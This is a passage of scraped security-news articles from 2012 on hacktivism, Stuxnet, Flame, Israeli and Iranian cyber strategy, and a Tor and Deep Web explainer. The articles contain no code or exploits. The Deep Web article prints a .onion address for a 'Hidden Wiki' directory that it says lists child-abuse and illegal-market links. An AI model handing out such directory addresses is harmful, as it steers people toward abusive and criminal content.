to decline and, to give strength to their operations, hacktivists would be obliged to make public appearances, presenting their vision and political programmes to the world through their representatives. The groups are aware that their attacks may begin to serve a third cause, not just their own.\n\nAnalysing for example the Anonymous case, we must distinguish two phases of Anonymous phenomenon, the first one that I define \u201cHere I am, know me and learn to live with my judgment\u201d is the one we are leaving \u2212 in this phase the group introduced itself to the world, showing its offensive capabilities but also enjoying broad support. The second phase, named \u201cOpenness\u201d, is the one we will live in the coming months. In this phase the group will try to talk with institutions, will operate on the internet, but also in the street. The stage is very delicate. Because of the heterogeneous nature of the groups, many hacktivists will not accept the openness of institutions, deciding instead to pursue a policy separate from the line indicated by the collective, perhaps seeing themselves as victims who, through becoming loose cannons in the web, could stage indiscriminate and unethical attacks.\n\nThis is the worst scenario, where chaos may reign on the web, where regulations cannot keep up with social change, and where some government and corporate bodies are trying to create a sense of security and trust in the cyber environment, while others seek to exploit what some world class security experts state is a history of generations of deployments of insecure cyber systems, with subsequent endless security patching.\n\nIt is time to revert to the fundamentals, to insist only on cyber systems that are built secure from the ground up, and in the meantime we can also continue to support the call for more openness in government and corporate management, whereby it would not fall to hacktivist groups to be, at times, the ones to have to expose actions and attitudes by people and organisations in positions of trust failing to satisfy democratic principles and working counter to future harmonious international relations. When all is said and done, a secure and resilient cyber domain should be a universal and fundamental right, along with honesty and transparency in both government and corporate governance. No doubt the future will see more hacktivism and hopefully other less disconcerting forms of Internet enabled social activism to achieve these constructive objectives.\n\nICT Gozo Malta is a joint collaboration between the Gozo Business Chamber and Synaptic Labs, part funded by the Ministry for Gozo, Eco Gozo Project, and prize winner in the 2012 Malta Government National Enterprise Innovation Awards. www.ictgozomalta.eu has links to free cyber awareness resources for all age groups.

The uncomfortable truth was disclosed by The New York Times that could have shed light on one of the most disturbing questions of global security landscape. The article is adapted from journalist David Sanger\u2019s forthcoming book, Confront and Conceal: Obama\u2019s Secret Wars and Surprising Use of American Power, and it confirms that both the US and Israeli governments developed and deployed Stuxnet.\n\nThe real problem as we will see is the damage caused by the uncontrolled spread of dangerous virus to computing facilities across the world.\n\nStuxnet was designed with the intent to interfere and destroy the control systems inside the Iranian nuclear plan in which it assumes is being carried out the dangerous design of President Ahmadinejad to develop a nuclear arsenal with which to threaten the Western enemy. But the U.S. does not have acted alone, as it has been suspected they had the precious collaboration of Israeli computer scientists who have contributed to strengthening the malware.\n\nThe development has been conducted with intensive collaboration of the the NSA and the secret Israeli 8200 unit, a complex work of intelligence to realize a dangerous cyber weapon able to attack SCADA system in Natanz plant.\n\nStriking are the backgrounds on the tests revealed the malware being developed, once it was completed the United States began building replicas of Iran\u2019s P-1 centrifuges, a project that Iran purchased from Abdul Qadeer Khan, the Pakistani nuclear chief.\n\nThe US fortunately already owned a P-1s model because when Colonel Qaddafi gave up his nuclear weapons program in 2003, he turned over the centrifuges he had bought from the Pakistani nuclear ring, and they were placed in storage at a weapons laboratory in Tennessee. The results of the test were satisfactory, the malware demonstrated its efficiency to shut down operations in the test site.\n\nMr. Obama decided to accelerate the attacks even after, for an apparently error, the virus was spread outside the Iran infecting machines also in other countries. The article published by The New Your Times reports of a tense meeting in the White House Situation Room, within days of the cyber offensive, attended by President Obama, Vice President Biden Jr. and the director of the Central Intelligence Agency at the time, Leon E. Panetta.\n\nDuring the meeting was discussed the opportunity to stop the diffusion of the malware outside Iran\n\n\u201cShould we shut this thing down?\u201d President Obama asked\n\nThe effectiveness of cyber operation that was causing damage to the systems of SCADA components of Iran\u2019s nuclear plants led to the decision to continue with the attacks, despite the virus was spreading outside Iran. Considering the potential offensive threat this decision is really questionable, the virus could damage other critical infrastructures, including Western countries, with unpredictable consequences.\n\n\n\nPresident Obama concluded the secret summit declaring that when it came to stopping Iran, the United States had no other choice.\n\nDuring the next week at least two new version of the malware have hit the Natanz nuclear plant and other facilities in Iran.\n\nThe NYT has collected during the last 18 months reserved information from former American, European and Israeli officials involved in the operations declaring to keep secret their identities.\n\nWhat is considerable are the results obtained with the usage of cyber weapons by US against a historical enemy, demonstrating how much aggressive could be also a covert operation in cyberspace. The US was secretly working on cyber weapon development achieving, with malware, what until then could be accomplished only by conventional military operations.\n\n\u201cPrevious cyberattacks had effects limited to other computers,\u201d Michael V. Hayden, the former chief of the CIA, said, declining to describe what he knew of these attacks when he was in office. \u201cThis is the first attack of a major nature in which a cyberattack was used to effect physical destruction,\u201d rather than just slow another computer, or hack into it to steal data.\n\n\u201cSomebody crossed the Rubicon,\u201d he said.\n\nAccording the information collected, once Obama has taken the place of Bush authorized the attacks to continue requesting to be constantly updated on the event and requesting its express authorization to proceed for each phase of the operation.\n\n \u201cFrom his first days in office, he was deep into every step in slowing the Iranian program \u2014 the diplomacy, the sanctions, every major decision,\u201d a senior administration official said.\n\nBut do not forget that these days Iran was the scene of a new cyber attack, malware Flame seems to have infected Iranians systems for years with a very aggressive agent with purposes of cyber espionage. Again U.S. and Israel have denied every responsibility, however it is clear that we encounter a new and powerful weapon used for purposes of espionage and ready to be turned into a formidable offensive weapon.\n\nDespite enormous differences with Stuxnet it\u2019s clear that Flame could be another face of the US offensive against Iran, but according the opinion of several expert, this time also the industry of antivirus system could be involved the noisy behavior of the agent. It\u2019s not first time that private industry help government in covert operations, it happened for example in German, where a private company, DigiTask , developed and sold a spyware program for public authorities in Bavaria.  Of course in this case we are speaking of a different kind of help, making for example invisible the malware to the common antivirus systems.\n\nOn the question Mikko Hypponen, Chief Research Officer of F-Secure, declared:\n\nA couple of days ago, I received an e-mail from Iran. It was sent by an analyst from the Iranian Computer Emergency Response Team, and it was informing me about a piece of malware their team had found infecting a variety of Iranian computers. This turned out to be Flame: the malware that has now been front-page news worldwide.\n\nWhen we went digging through our archive for related samples of malware, we were surprised to find that we already had samples of Flame, dating back to 2010 and 2011, that we were unaware we possessed. They had come through automated reporting mechanisms, but had never been flagged by the system as something we should examine closely. Researchers at other antivirus firms have found evidence that they received samples of the malware even earlier than this, indicating that the malware was older than 2010.\n\nWhat this means is that all of us had missed detecting this malware for two years, or more. That\u2019s a spectacular failure for our company, and for the antivirus industry in general.\n\nand again\n\nStuxnet, Duqu and Flame are not normal, everyday malware, of course. All three of them were most likely developed by a Western intelligence agency as part of covert operations that weren\u2019t meant to be discovered. The fact that the malware evaded detection proves how well the attackers did their job.\n\nThe truth is, consumer-grade antivirus products can\u2019t protect against targeted malware created by well-resourced nation-states with bulging budgets. They can protect you against run-of-the-mill malware: banking trojans, keystroke loggers, and e-mail worms.\n\nExamining the cyber operation form a political perspective it\u2019s clear that a cyber operation has a great efficiency, the damage caused by Stuxnet have postponed or stopped an imminent conventional strike of Israel against Iran.\n\nWhat is not acceptable are the risks to which a not controlled cyber weapon have exposed computer systems all over the world, the same US critical infrastructures have been exposed to the cyber weapon.\n\n\n\nThe problems begun during the summer of 2010 when the diffusion of the malware gone out of control, starting to spread itself out of Natanz plant. It was not clear the reason of the unexpected spread:\n\n\u201cWe think there was a modification done by the Israelis,\u201d\n\none of the briefers told the president,\n\n\u201cand we don\u2019t know if we were part of that activity.\u201d\n\nMr. Biden reported to the President\n\n\u201cIt\u2019s got to be the Israelis,\u201d \u201cThey went too far.\u201d\n\nIf the news will be confirmed it could represent an historical event, the usage of a cyber weapon has substituted a military strikes obtaining same results, destroying enemy line.\n\nThe question is:\n\nHow many Stuxnet like malware are operating around the word and where?\n\nSyria, N. Korea, China and Russia could be under attack with a new generation of cyber weapons.\n\nThe International Strategy for Cyberspace describes the cyber attacks are serious and dangerous business. The US in fact reserves the right to use even military force to respond to similar attacks. \n\n\u201cAll states possess an inherent right to self-defense, and we recognize that certain hostile acts conducted through cyberspace could compel actions under the commitments we have with our military treaty partners,\u201d \n\n\u201cWe reserve the right to use all necessary means\u2014diplomatic, informational, military, and economic\u2014as appropriate and consistent with applicable international law.\u201d\n\nIn the coming years will see an increasing number of similar events, will leave vulnerable antivirus systems architectures powerless over the planet, the same nations attackers could suffer the dreaded boomerang effect due to the uncontrolled spread of cyber weapons. Fortunately, to date no catastrophes have happened, but in future the effects could be unpredictable.\n\nThe cyber war is begun and we must consider that these cyber threats could be used against every country and adopted in covert operations for several years.  Are we really prepared?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/international-strategy-for-cyberspace", "topic_name": "International Strategy for Cyberspace"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/maware", "topic_name": "maware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/n-korea", "topic_name": "N.Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/olyimpic-games", "topic_name": "Olyimpic Games"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/syria", "topic_name": "Syria"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}]}, {"news_name": "Israel and Iran, expense, capabilities and cyber strategies", "news_link": "https://securityaffairs.co/wordpress/5950/intelligence/israel-and-iran-expense-capabilities-and-cyber-strategies.html", "title": "Israel and Iran, expense, capabilities and cyber strategies\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 31, 2012", "body": "In recent days the discovery of Flame malware  has captured the attention of the media, the internet is monopolized by related news, many experts have identified Israel as the author of the technological miracle, a perfect tool for cyber espionage that could suddenly mutate in an offensive cyber threat. It\u2019s clear that Iran share same conviction, the government of Teheran beliefs that behind the last wave of attacks there are the Western enemies and Israel, of course these countries known to be possible targets of  attacks and retaliation, and the cyber space is most probable scenarios.\n\nGovernment of Israel is massive investing on cyber security demonstrating a great attention to incoming cyber threats, it has announced that it will expend more than $13 million in the coming years to develop new technologies for cyber defence.\n\nNetworks, critical infrastructures, military environments and private companies must be protected from foreign cyber attacks.\n\nIsraeli networks are daily goal of thousands of cyber attacks conducted by hostile governments, hacktivist and independent hackers who want to compete with one of the most advanced nations, for obvious reasons are reported only in presence of substantial losses or sensational data breach.\n\nThe National Cyber Committee, a department under direct control of the Prime Minister\u2019s Office, will coordinate with the Science and Technology Ministry the project during at least three years,  reserving each year $525,000 for advanced cyber security projects sponsored by corporations, and $80,000 to generation with scholarships.\n\nThe government of course has a great interest to improve security of its critical infrastructures, due this reason it will push the researchers to develop project that will cover there delicate areas such as banking, defence, government and smart grids in general.\n\nThe project will not cover only the development of cyber defence systems but it will support the researches on cyber-psychology, analyzing the user\u2019s reaction to a cyber attacks and the capability to identify groups of hackers and terrorists cell anticipating  cyber operations against the national security.\n\nNational Cyber Committee is actual under retired general Yitzhak Ben Yisrael that during an interview expressed the importance to support private firms in the cyber security matter.\n\n\u201cThis is not a government program to encourage people to install anti-virus software. That kind of thing is better done by the private sector. What we want to do is work with the private sector, to guide them on the kinds of products and services needed to ensure that our data remains safe.\u201d\n\nReally interesting the opinion of Prime Minister Benjamin Netanyahu regarding the committee that view in the project an opportunity of business, exporting developed technologies to member of alliances to extend their cyber security.\n\nWhat is Iran\u2019s position on cyber warfare? Why the government of Tehran invests so much in cyber security?\n\nGiving a look at the comparative strengths of the Iranian and Israeli forces we will note an impressive discrepancy in capabilities and numbers of enlisted troops. Despite Iran population is ten times bigger than Israel\u2019s, the situation of its military hardware is disastrous due to the decennial arms embargo.\n\n\n\nIran is also aware of the potential effects of a cyber attacks against its enemy, the critical infrastructures all over the world are still too vulnerable and the cyber warfare gives the opportunity to move covert offensive. Of course also foreign government are aware of this, that\u2019s way the new battle field is become the cyber space, Stuxnet, Duqu and  Flame are the demonstration.\n\nOn December Tehran has announced an ambitious plan to improve its cyber-warfare capabilities investing $1 billion in developing new technologies and creating new team of cyber experts.\n\nFearing cyber attacks, the Israel Defence Forces has also drafted a multi-year plan to lead to a major boost in military capabilities over the coming five years involving Military Intelligence\u2019s Unit 8200.\n\nThe Unit in collaboration with the C4I Corps, the national Teleprocessing Corps, are working to improve cyber capabilities.\n\nA new division has been created within the C4I Directorate, it is run by former commander of Matzov with the intent to protect the IDF networks.\n\nAre Israeli facilities safe? Is Israel able to reject any attack?\n\nChairman of the Israel Electric Corporation Maj.-Gen. (res.)

But this is a story already seen in the Stuxnet case, all denied meanwhile intelligence and military experts have reported that Stuxnet was tested at the Dimona nuclear complex in Israel in a joint U.S.-Israeli effort to undermine the Iranian program.\n\n\u201cWhoever sees the Iranian threat as a serious threat would be likely to take different steps, including these, in order to hurt them.\u201d\n\nRichard Silverstein on Israel\u2019s liberal Tikun Olam Web site under the headline \u201cThe country that brought us Iranian nuclear assassinations, explosions at Iran missile bases, and Stuxnet, is at it again,\u201d wrote :\n\n\u201cIsrael\u2019s new contribution to Middle East cyberwar.\u201d\n\n\u201cThe goal is apparently to infiltrate the computers of individuals in Iran, Israel, Palestine and elsewhere who are engaged in activities that interest Israel\u2019s secret police, including military intelligence,\u201d\n\nsuggesting Israeli intelligence might even be using the worm to spy on its own citizens.\n\nI define erroneously the malware as \u201cnew\u201d, but the experts are convinced that it is datable to 2010, exactly the same period of the predecessor Stuxnet. Both malware appear to be very dangerous cyber threats but the complexity of Flame has no precedents.\n\n\n\nThis first information let and arouses many questions, why two malware so innovative and profoundly different, circulated in the same period to hit Iran?\n\nThe researchers of the several teams that are investigating on the discovery believe that the two agents were developed by different groups of experts with completely different development techniques and related to totally different projects. Flame is considered more complex due its intelligence features, but both are modular software.\n\nI have hypothesized the following scenarios:\n\nVery interesting is the composition of the Flame source code, written in C++ and Lua, that has been published on different web site.  The total size of the package is almost 20 MB including many different libraries and a LUA virtual machine.\n\nThe size is really significant for a malware, and it justified by the large number of features provided, but how is it possible that an agent of this size has eluded so many years the leading manufacturers of security systems?\n\nWhy has been used Lua and which info can we derive from its usage?\n\nTo the first question I have no answers, personally I believe it\u2019s incredible how long the malware has been invisible to the security word. For at least two years experts from around the world, following the Stuxnet case, have failed to isolate the malware despite the world community was on alert. The malware as we shall soon was recognized as a powerful tool for cyber espionage, unusual in its composition by size and complexity, qualities that would make it extremely noisy. Consider also that the antivirus industry evolves daily to respond to cyber threats, however Flame malware remained transparent to them, a sign that it has changed over time with security systems, remains lawful why do not we have heard about it before.\n\nRegarding Lua, its usage let me believe that the developer have great skill, the choice of the scripting language is mainly motivated by the following factors:\n\nAll this characteristics let me thing that we are facing with an ongoing project, open to the development of new module, maybe with offensive purpose, and portable, this means that in the future it will be available new offensive modules that could address different platform, not only Windows machines.\n\nResponse of Security Firms and antivirus supplier\n\nDespite the complexity of the agent, the principal antivirus supplier have immediately worked to the development of a removal kit,  Bitdefender released a tool to find and remove the Flamer attack toolkit (Download the 32-bit or the 64-bit removal tools).\n\nCatalin Cosoi Bitdefender\u2019s Chief Security Researcher declared:\n\n\u201cFlamer is the scariest cyber espionage tool we\u2019ve yet seen. It goes places where other spyware doesn\u2019t go, retrieves information others don\u2019t retrieve, and ensures the infected computer has no privacy whatsoever,\u201d\n\n\u201cLuckily, the Bitdefender removal tool makes it easy to eliminate from your computer.\u201d\n\nAccording to some experts the announcement of the malware detection was first provided by Kaspersky Lab researchers but Iran claims the discovery, anyway ready was the response of the leading manufacturers of security systems. This information together with the one related to malware dating on 2010, would be to think that the majors security companies were aware of the project Flame and have been silent for agreements with Western governments. Just in the last months Western countries have decided to suspend the supply of antivirus systems to Iran for penalty forcing the country to develop its own antivirus system, maybe this development has rapidly brought to the discovery of the agent. If confirmed why the antivirus companies haven\u2019t detected it before? Is it a coincidence?\n\nAs Kaspersky team declared the malware is datable on 2010 and it has been isolated only in Middle East area, no incidents have been reported to western critical infrastructures.\n\n\n\nWhy the cyber threat hasn\u2019t impacted worldwide infrastructures in the last couple of years?\n\nNow that the malware has been detected is correctly started a global alert on its possible impact on critical infrastructures. Flame is a powerful cyber espionage toolkit that could steal sensible information and that thank to its modularity could be instructed to attacks victims systems.\n\nAccording the Reuters agency an United Nations (UN) agency official has expressed him concerns regarding the impact of the malware on critical infrastructures of member states. UN will provide a detailed alert on the cyber threat and the International Telecommunications Union (ITU) will also coordinate collection of virus samples.\n\n\u201cThis is the most serious (cyber) warning we have ever put out,\u201d said Marco Obiso, cyber security coordinator for the U.N.\u2019s Geneva-based International Telecommunications Union.\n\n\u201cThey should be on alert,\u201d\n\nAccording to official reports, none of the instances identified shall be able to attack industrial control systems, however, concern is high due the complexity of the malware that could allow the agent to change its behavior simply by integrating a module written for the purpose. At this time Flame is a powerful tool for information gathering, there is no evidence that it has components to attack SCADA or ICS, this particular makes more similar it to Duqu that is known to steal information rather than destroying equipments.\nThe scalability of the malware is not something new, let\u2019s remind a similar features in Stuxnet and Duqu.  Symantec reported that Flame appears to be the same worm that hit the Iranian Oil Ministry during the last weeks impacting its facilities at the Kharg Island terminal.\n\nThe cyber war is reality\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/antivirus", "topic_name": "antivirus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/middle-east", "topic_name": "Middle East"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Call it Flame, Flamer or Skywiper \u2026 it\u2019s a new cyber weapon", "news_link": "https://securityaffairs.co/wordpress/5858/malware/call-it-flame-flamer-or-skywiper-its-a-new-cyber-weapon.html", "title": "Call it Flame, Flamer or Skywiper \u2026 it\u2019s a new cyber weapon\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 28, 2012", "body": "The day is come, The Iranian Computer Emergency Response Team (MAHER) announced to have discovered a new targeted malware which has hit the country, that has been named Flame (also known as Flamer or Skywiper due the name of  its main modules).\n\nIn an official statement the Iranian experts declared that following the intensive researches on the malware Stuxnet and Duqu since 2010 they have detected a new agent responsible of a new wave of attacks. The malware has been named \u201cFlamer\u201d due one of the attack modules code isolated and decrypted.\n\nWhat is really interesting is the capability of the malware to dynamically change its behavior thanks the possibility to receive and install different modules projected for specific goals. Another interesting feature is that the malware is actually able to be undetectable by all the 43 tested anti viruse software.\n\n\n\nThe Maher center has developed a specific detector delivered only to selected organizations and companies in first days of May, and it\u2019s working on the realizzation of a removal tool that will be soon delivered.\n\nFollowing some feature of the malware listed in the announced of the center:\n\nThe specialists of the center are sure that the malware is a new cyber weapondue its complexity level and propagation methods, they don\u2019t exclude that recent mass data loss in Iran could be related to the attack of the malware.  The malware seems target mainly windows platform running Windows XP, Vista and Windows 7 and the isolated istances of the agents are capable of password and data stealing, sniffing network traffic, taking screenshots, recording audio conversations, intercepting the keyboard, and so on.  All the collected data could be sent to the to Flame\u2019s command-and-control servers. Curious the usage of Bluetooth protocol, once the victim has the functionality turned on, Flame is able to collect information about discoverable devices nearby.\n\nIt\u2019s not yet clear with is the entry point for Flame malware, the principal suspects address the exploit of a Microsoft vunerability.\n\nAccording Kaspersky lab experts the malware has hit mainly the Middle East area and it is considered a very sophisticated cyber weapon with main purpose of cyber espionage. The team has defined Flame as a sophisticated attack toolkit which condenses the characteristics of a backdoor, a Trojan, and a worm. It\u2019s able to spread itself within a local network and on removable media.\n\n\n\nThey have defined the malware as the most complex threats ever discovered. Flame is a sophisticated attack toolkit, which is a lot more complex than Duqu. It is a backdoor, a Trojan, and it has worm-like features, allowing it to replicate in a local network and on removable media if it is commanded so by its master.\n\n \n\n\n\nThe malware seems to be active since 2010, same period of Stuxnet, but analyzing its complexity the expert believe that is the result of a parallel intelligence project. Today several C&C servers exist around the world, about a dozen different C&C domains, run on several different servers.\n\nAnother feature of the malware is the size of its package, almost 20 MB including many different libraries and a LUA virtual machine. LUA is a cross-platform scripting language with \u201cextensible semantics\u201d. Many mosules of Flame have been written using the scripting language and interfacing it with subroutines and libraries compiled from C++, the use of LUAlanguage is very uncommon such as the large size of the toolkit. Generally, modern malware is small and written in really compact programming languages, which make it easy to hide. The practice of concealment through large amounts of code is one of the specific new features in Flame.\n\n\n\nThe experts that have analyzed the malware noted an internal use of local databases with nested SQL queries, multiple methods of encryption, various compression algorithms, usage of Windows Management Instrumentation scripting, batch scripting and more, making the attack very significant.\n\nWho has developed the malware?\n\nFlame is really different form Stuxnet and Duqu, they are results of separated projects that have had the same target.\n\nAssuming this is a cyber weapon we have the following scenarios:\n\nWhy do believe that Flame is a cyber weapon?\n\nBecause cybercrime and hacktivism make a different usage of malware and because it has been used for targeted attacks in a confined geographic area.\n\nThe cyber war is begun\n\nPierluigi Paganini\n\n\n\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flamer", "topic_name": "Flamer"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/skywiper", "topic_name": "Skywiper"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "What is the Deep Web?

We will literally be shocked, and this is the reaction of those individual who can understand the existence of the Deep Web, a network of interconnected systems, are not indexed, having a size hundreds of times higher than the current web, around 500 times.\n\nVery exhaustive is the definition provided by the founder of BrightPlanet, Mike Bergman, that compared searching on the Internet today to dragging a net across the surface of the ocean: a great deal may be caught in the net, but there is a wealth of information that is deep and therefore missed.\n\n\n\nOrdinary search engines to find content on the web using software called \u201ccrawlers\u201d. This technique is ineffective for finding the hidden resources of the Web that could be classified into the following categories:\n\nA parallel web that has a much wider number of information represents an invaluable resource for private companies, governments, and especially cybercrime. In the imagination of many persons, the DeepWeb term is associated with the concept of anonymity that goes with criminal intents the cannot be pursued because submerged in an inaccessible world.\n\nAs we will see this interpretation of the Deep Web is deeply wrong, we are facing with a network definitely different from the usual web but in many ways repeats the same issues in a different sense.\n\nWhat is a Tor? How to preserve the anonymity?\n\nTor is the acronym of \u201cThe onion router\u201d, a system implemented to enable online anonymity. Tor client software routes Internet traffic through a worldwide volunteer network of servers hiding user\u2019s information eluding any activities of monitoring.\n\nAs usually happen, the project was born in military sector, sponsored the US Naval Research Laboratory and from 2004 to 2005 it was supported by the Electronic Frontier Foundation.\n\nActually the software is under development and maintenance of Tor Project. A user that navigate using Tor it\u2019s difficult to trace ensuring his privacy because the data are encrypted multiple times passing through nodes, Tor relays, of the network.\n\nImagine a typical scenario where Alice desire to be connected with Bob using the Tor network. Let\u2019s see step by step how it is possible.\n\nShe makes an unencrypted connection to a centralized directory server containing the addresses of Tor nodes. After receiving the address list from the directory server the Tor client software will connect to a random node (the entry node), through an encrypted connection. The entry node would make an encrypted connection to a random second node which would in turn do the same to connect to a random third Tor node. The process goes on until it involves a node (exit node) connected to the destination.\n\nConsider that during Tor routing, in each connection, the Tor node are randomly chosen and the same node cannot be used twice in the same path.\n\nTo ensure anonymity the connections have a fixed duration. Every ten minutes to avoid statistical analysis that could compromise the user\u2019s privacy, the client software changes the entry node\n\nUp to now we have considered an ideal situation in which a user accesses the network only to connect to another. To further complicate the discussion, in a real scenario, the node Alice could in turn be used as a node for routing purposes with other established connections between other users.\n\nA malevolent third party would not be able to know which connection is initiated as a user and which as node making impossible the monitoring of the communications.\n\n\n\n \n\nAfter this necessary parenthesis on Tor network routing we are ready to enter the Deep Web simply using the Tor software from the official web site of the project. Tor is able to work on all the existing platforms and many add-ons make simple they integration in existing applications, including web browsers. Despite the network has been projected to protect user\u2019s privacy, to be really anonymous it\u2019s suggested to go though a VPN.\n\nA better mode to navigate inside the deep web is to use the Tails OS distribution which is bootable from any machine don\u2019t leaving a trace on the host. Once the Tor Bundle is installed it comes with its own portable Firefox version, ideal for anonymous navigation due an appropriate control of installed plugins, in the commercial version in fact common plugins could expose our identity.\n\nOnce inside the network, where it possible to go and what is it possible to find?\n\nWell once inside the deep web we must understand that the navigation is quite different from ordinary web, every research is more complex due the absence of indexing of the content.\n\nA user that start it\u2019s navigation in the Deep Web have to know that a common way to list the content is to adopt collection of Wikis and BBS-like sites which have the main purpose to aggregate links categorizing them in more suitable groups of consulting. Another difference that user has to take in mind is that instead of classic extensions (e.g. .com, .gov) the domains in the Deep Web generally end with the .onion suffix.\n\nFollowing a short list of links that have made famous the Deep Web published on Pastebin\n\n \n\n\n\nCleaned Hidden Wiki should be a also a good starting point for the first navigations\n\nhttp://3suaolltfj2xjksb.onion/hiddenwiki/index.php/Main_Page\n\nBe careful, some content are labeled with common used tag such as CP= child porn, PD is pedophile, stay far from them.\n\nThe Deep Web is considered the place where every thing is possible, you can find every kind of material and services for sale, most of them illegal. The hidden web offers to cybercrime great business opportunity, hacking services, malware, stolen credit cards, weapons.\n\nWe all know the potentiality of the e-commerce in ordinary web and its impressive growth in last couple of years, well now imagine the Deep Web market that is more that 500 times bigger and where there is no legal limits on the odds to sell. We are facing with amazing business controlled by ciber criminal organizations.\n\nSpeaking of dark market we cannot avoid to mention Silk Road web site, an online marketplace located in the Deep Web, the majority of its products are derived from illegal activities. Of course it\u2019s not the only one, many other markets are managed to address specify products, believe me, many of them are terrifying.\n\n\n\n \n\nMost transactions on the Deep Web accept BitCoinsystem for payments allowing the purchase of any kind of products preserving the anonymity of the transaction, encouraging the development of trade in respect to any kind of illegal activities. We are facing with a with an autonomous system that advantage the exercise of criminal activities while ensuring the anonymity of transactions and the inability to track down the criminals.\n\nBut is it really all anonymous? Is it possible to be traced in the Deep Web? What is the position of the governments towards the Deep Web?\n\nI will provide more information on the topic in next articles \u2026 in meantime let me thank a great expert of the Deep Web, \u201cThe gAtOmAlO\u201d with whom I collaborate on a project which we will present you soon.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Deep Web) \n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymity", "topic_name": "anonymity"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/bitcoin", "topic_name": "Bitcoin"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/deep-web", "topic_name": "Deep Web"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/privacy", "topic_name": "privacy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/search-engines", "topic_name": "search engines"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tor", "topic_name": "Tor"}]}, {"news_name": "Iranian hackers against NASA,isolated attack or cyber warfare act?", "news_link": "https://securityaffairs.co/wordpress/5609/hacking/iranian-hackers-against-nasaisolated-attack-or-cyber-warfare-act.html", "title": "Iranian hackers against NASA,isolated attack or cyber warfare act?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 23, 2012", "body": "Exactly on week ago a group of Iranian hackers named Cyber Warriors Team claimed to have compromised an SSL certificate issued to the Research and Education Support Services of NASA.  The press released by the Cyber Warriors Team said that hackers have written an HTTPS protocol scanner to find weaknesses in the NASA website.  A NASA spokesman hasn\u2019t denied the hack declaring that the agency is currently investigating on the event.\n\nWhy steal a certificate?\n\nLast year I wrote an article on the main reasons behind the theft of a digital certificate, let\u2019s remind the principal motivations:\n\nMalware production \u2013 Installation for certain types of software could needs that its code is digitally signed with a 